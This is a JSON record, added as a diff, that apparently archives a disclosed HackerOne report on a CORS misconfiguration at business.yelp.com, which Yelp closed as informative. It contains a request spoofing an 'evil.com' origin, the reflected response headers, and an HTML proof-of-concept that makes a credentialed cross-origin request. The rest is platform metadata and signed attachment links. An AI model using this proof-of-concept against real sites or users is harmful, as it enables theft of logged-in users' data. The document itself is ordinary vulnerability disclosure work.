@@ -1,0 +1,196 @@
+{
+  "id": 1707616,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA3NjE2",
+  "url": "https://hackerone.com/reports/1707616",
+  "title": "CORS Misconfiguration on Yelp",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2022-09-21T16:13:35.603Z",
+  "submitted_at": "2022-09-21T16:13:35.691Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "qualw1n",
+    "url": "/qualw1n",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/13fyf5yr18vwckbahj60u2m9aokx/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 545,
+    "url": "https://hackerone.com/yelp",
+    "handle": "yelp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Yelp",
+      "twitter_handle": "",
+      "website": "https://www.yelp.com",
+      "about": "Connecting people to great local businesses in communities around the world."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-09-28T03:43:10.963Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-09-28T03:43:10.891Z",
+  "team_member_agreed_on_going_public_at": "2022-09-27T22:57:17.579Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Entry\nAn cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page\n\n## Description:\nCORS misconfiguration is found on business.yelp.com as Access-Control-Allow-Credentials: true.\n\n## Steps to reproduce:\n\nVisit business site.\n\n## Request\nGET /wp-json HTTP/2\nHost: business.yelp.com\nSec-Ch-Ua: \"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\nOrigin: evil.com\n\n## Response\nAllow: GET\nAccess-Control-Allow-Origin: http://evil.com\nAccess-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE\nAccess-Control-Allow-Credentials: true\n\n## POC\n<!DOCTYPE html>\n<html>\n    <head>\n        <script>\n            function cors() {\n                var xhttp=new XMLHttpRequest();\n                    xhttp.onreadystatechange= function() {\n                        if (this.readyState == 4 && this.status ==200){\n                            document.getElementById(\"emo\").innerHTML=alert(this.responseText\n                                );\n                        }\n                };\n                xhttp.open('GET',\"https://business.yelp.com/wp-json/\",true);\n                xhttp.withCredentials=true;\n                xhttp.send();\n            }\n        </script>\n    </head>\n    <body>\n        <center>\n        <h2>[!]CORS P0C - Qualw1n</h2>\n        <div id=\"demo\">\n            <button type=\"button\" onclick=\"cors()\">Exploit</button> \n        </div>\n        </center>\n    </body>\n</html>\n\n## Photo\n{F1945188}\n\n## Impact\n\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.\nAlso If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1945188,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dbgusl914o04v65qhnu4qoxywpjo?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQFGVW4KO%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050554Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIGxo3b5XV%2FxPTqhfuI54b3MGIBW9d%2Bmn4M6eQ5FnA992AiAZLM6%2FPGYj9ztH2raUwHKRrtzbUtZMpMshbmkuRiUxgCqxBQgGEAMaDDAxMzYxOTI3NDg0OSIMAOlhmkQEr%2FICw0FIKo4FenlppRZg6jvWQps40NqeeqGIxfHzoRjeN66eDtVywr4BDJlD%2BEGPxuBSU%2BcqVLZ3p%2F3yr8LjOAQZ7%2Bil91ndFmWTqwBxr%2BrXK%2BWmkh9Vds9gOn0De6DpOD1RNIhdtXz8eJClumO%2BO54WIC28thFHN4ZyPDdl%2FMlgDxpJn4fD3%2B%2FqnAtT%2Fjk7q0IX3ATBqLPNRl92h%2FL%2Fw%2BgLSnU3Z6rSc7uca5%2BjyrcIwXvkSj0n%2B9jvyFtafPvu8vgu2CzVcI%2FXgl%2FQEhCycOQZ9SO58bg%2BUtOT1B9J2i3ga4j8VcywFD%2FDlrX6c%2Fr90uJwUUTxGjs3qVI94bUUDmTmXH0NLUdCNERqtnd%2Bi6pn73XQJmDlodDODh5bISrIEMw667GU7hTJc0wXp3%2BewAZ6yEesj1nr83m098hiVB7aa3ClFtjNq0Q4%2B5oIv37UwlhJrrVrBg0KXrFdFi8lQuGKG5zxhO1EdVbDuiI%2FcUtqxViKW7jR3w%2FH6s7ui11ZKaM9ydto5KhX4y1R02bJmcooOCNru5p%2FHT0yY2ZS3ZIzba7cIAtFsL1wElkbicyccD48xXIXOR02aidTepU1Bf4W4CfjZKFAAWOL6%2FAB07iyLhlaDbNFSQQJSry%2FbwtZeLz4oy03mANo4bx%2BaisrdYVLkoK6vn%2FRzmIYjSgK3BtwJFSlOtma9K1z%2FHLA5cDIp8TsfAjCFKcqiRUOHSWOxjwV4Kn2YvYbBhPrtKyf%2F5kyWzbfWG6GKprgS47oSTjgREkdxRBhf9zMt9rj9TYlDSh7t2RjluOhIVL1Y9n5EkFcPP5GJ5bj48un7ylRIWzU1FHjD4q9uK8hOJjpl%2Bv9nAAu%2F7H4XAMPZh4o%2BsVZiCvxr9gpS3MJMKj%2BnNIGOrIB%2FyBpE8DgGI7cVadvcZGDxVg96HMSmqWCKeLXwcIgfo1y60vReADggvWF4EACYz7FkEW%2ByQ5%2FomoJI7waLs7CFwjgvT86S%2Fa79hScuVvEXBqFzIryQMi9ourpT5561M7Y2iF3KA7%2F9qYTU9wB9bz%2F3DQMJdnVeFK2Fulr0tY7HN5qMqQurQGmRzt4f%2BPQc6p0j7bJk9jasV2CfG5LovxeUirBr%2BTpwXZzsBcZjuLo3QmPIA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8097f88c9d6c2d3659951959b635bf86befc778a88febfc4d0d44c0eb54cc1fe",
+      "file_size": 34692,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1945192,
+      "file_name": "2022-09-21_19-12-05.mkv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tv559lukkpn6a7doc4sbk6n7wypq?response-content-disposition=attachment%3B%20filename%3D%222022-09-21_19-12-05.mkv%22%3B%20filename%2A%3DUTF-8%27%272022-09-21_19-12-05.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQFGVW4KO%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050554Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIGxo3b5XV%2FxPTqhfuI54b3MGIBW9d%2Bmn4M6eQ5FnA992AiAZLM6%2FPGYj9ztH2raUwHKRrtzbUtZMpMshbmkuRiUxgCqxBQgGEAMaDDAxMzYxOTI3NDg0OSIMAOlhmkQEr%2FICw0FIKo4FenlppRZg6jvWQps40NqeeqGIxfHzoRjeN66eDtVywr4BDJlD%2BEGPxuBSU%2BcqVLZ3p%2F3yr8LjOAQZ7%2Bil91ndFmWTqwBxr%2BrXK%2BWmkh9Vds9gOn0De6DpOD1RNIhdtXz8eJClumO%2BO54WIC28thFHN4ZyPDdl%2FMlgDxpJn4fD3%2B%2FqnAtT%2Fjk7q0IX3ATBqLPNRl92h%2FL%2Fw%2BgLSnU3Z6rSc7uca5%2BjyrcIwXvkSj0n%2B9jvyFtafPvu8vgu2CzVcI%2FXgl%2FQEhCycOQZ9SO58bg%2BUtOT1B9J2i3ga4j8VcywFD%2FDlrX6c%2Fr90uJwUUTxGjs3qVI94bUUDmTmXH0NLUdCNERqtnd%2Bi6pn73XQJmDlodDODh5bISrIEMw667GU7hTJc0wXp3%2BewAZ6yEesj1nr83m098hiVB7aa3ClFtjNq0Q4%2B5oIv37UwlhJrrVrBg0KXrFdFi8lQuGKG5zxhO1EdVbDuiI%2FcUtqxViKW7jR3w%2FH6s7ui11ZKaM9ydto5KhX4y1R02bJmcooOCNru5p%2FHT0yY2ZS3ZIzba7cIAtFsL1wElkbicyccD48xXIXOR02aidTepU1Bf4W4CfjZKFAAWOL6%2FAB07iyLhlaDbNFSQQJSry%2FbwtZeLz4oy03mANo4bx%2BaisrdYVLkoK6vn%2FRzmIYjSgK3BtwJFSlOtma9K1z%2FHLA5cDIp8TsfAjCFKcqiRUOHSWOxjwV4Kn2YvYbBhPrtKyf%2F5kyWzbfWG6GKprgS47oSTjgREkdxRBhf9zMt9rj9TYlDSh7t2RjluOhIVL1Y9n5EkFcPP5GJ5bj48un7ylRIWzU1FHjD4q9uK8hOJjpl%2Bv9nAAu%2F7H4XAMPZh4o%2BsVZiCvxr9gpS3MJMKj%2BnNIGOrIB%2FyBpE8DgGI7cVadvcZGDxVg96HMSmqWCKeLXwcIgfo1y60vReADggvWF4EACYz7FkEW%2ByQ5%2FomoJI7waLs7CFwjgvT86S%2Fa79hScuVvEXBqFzIryQMi9ourpT5561M7Y2iF3KA7%2F9qYTU9wB9bz%2F3DQMJdnVeFK2Fulr0tY7HN5qMqQurQGmRzt4f%2BPQc6p0j7bJk9jasV2CfG5LovxeUirBr%2BTpwXZzsBcZjuLo3QmPIA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac6c3ca44b29e9e1857ccb441ff88c5c1460965d5b5e94b7b517c89aadc02f5a",
+      "file_size": 1931533,
+      "type": "video/x-matroska",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 18,
+  "voters": [
+    "shuvam321",
+    "shubham_srt",
+    "ashrafabdelrazik",
+    "qualw1n",
+    "mr_negative",
+    "berkep",
+    "l3pr3ch4un",
+    "shivammusic",
+    "the3eyedraven",
+    "god0022",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 43913,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.yelp.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1707616",
+  "votes": 18,
+  "latest_disclosable_activity_at": "2022-09-28T03:43:11.025Z",
+  "weakness": null,
+  "_metadata": {
+    "saved_at": "2026-07-03T13:05:54.718850",
+    "source": "https://hackerone.com/reports/1707616.json",
+    "report_id": 1707616
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA3NjE2",
+    "databaseId": "1707616",
+    "title": "CORS Misconfiguration on Yelp",
+    "url": "https://hackerone.com/reports/1707616",
+    "state": null,
+    "substate": "informative",
+    "disclosed_at": "2022-09-28T03:43:10.963Z",
+    "created_at": "2022-09-21T16:13:35.603Z",
+    "submitted_at": null,
+    "weakness": null,
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "qualw1n"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU0NQ==",
+      "handle": "yelp",
+      "name": "Yelp",
+      "url": "https://hackerone.com/yelp",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE3MDc2MTY=",
+    "_id": "1707616",
+    "disclosed": true,
+    "votes": 18,
+    "latest_disclosable_activity_at": "2022-09-28T03:43:11.025Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA3NjE2",
+      "databaseId": "1707616",
+      "title": "CORS Misconfiguration on Yelp",
+      "url": "https://hackerone.com/reports/1707616",
+      "disclosed_at": "2022-09-28T03:43:10.963Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU0NQ==",
+      "handle": "yelp",
+      "name": "Yelp",
+      "url": "https://hackerone.com/yelp",
+      "currency": "usd"
+    }
+  }
+}
